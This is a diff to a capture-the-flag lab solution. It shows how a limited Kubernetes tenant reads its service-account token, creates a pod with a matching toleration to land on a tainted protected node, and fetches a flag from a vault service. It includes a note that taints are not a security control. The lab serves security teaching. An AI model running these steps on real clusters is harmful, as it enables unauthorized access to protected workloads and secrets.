@@ -28,8 +28,14 @@
 
 ## Attack Path Summary
 ```
-Attacker pod (no toleration) → Discover tainted node with protected=true:NoSchedule → Create pod with matching toleration → Schedule on tainted node → Access vault service → Extract flag
+Attacker tenant (attacker-ns, limited RBAC) → Discover tainted node with
+  protected=true:NoSchedule → Create pod in own tenant with matching toleration
+  → Schedule on tainted node → Access vault service → Extract flag
 ```
+
+> 语义说明：taint/toleration 是调度机制，不是安全控制。该场景的“漏洞”是平台
+> 缺少准入策略来限制租户自行添加 toleration 并调度到受保护节点；攻击者本身
+> 只能在自己的 namespace（attacker-ns）内创建 pod。
 
 ## Prerequisites
 
@@ -51,16 +57,19 @@ kubectl describe nodes | grep -A1 Taint
 
 ### Step 2: Create Pod with Matching Toleration
 ```bash
-kubectl run tolerator --image=alpine:latest -n vault-ns \
+# Use the attacker SA token (RBAC is limited to attacker-ns)
+TOKEN=$(kubectl exec -n attacker-ns attacker-pod -- \
+  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+kubectl --token=$TOKEN run tolerator --image=alpine:latest -n attacker-ns \
   --overrides='{"spec":{"tolerations":[{"key":"protected","operator":"Equal","value":"true","effect":"NoSchedule"}]}}' \
   -- sleep 3600
 ```
 
 ### Step 3: Access Flag Service from Tolerator Pod
 ```bash
-kubectl wait --for=condition=Ready pod/tolerator -n vault-ns --timeout=30s
+kubectl --token=$TOKEN wait --for=condition=Ready pod/tolerator -n attacker-ns --timeout=30s
 FLAG_IP=$(kubectl get svc vault-svc -n vault-ns -o jsonpath='{.spec.clusterIP}')
-kubectl exec -n vault-ns tolerator -- wget -qO- http://${FLAG_IP}:8080
+kubectl --token=$TOKEN exec tolerator -n attacker-ns -- wget -qO- http://${FLAG_IP}:8080
 ```
 
 ## Flag Location
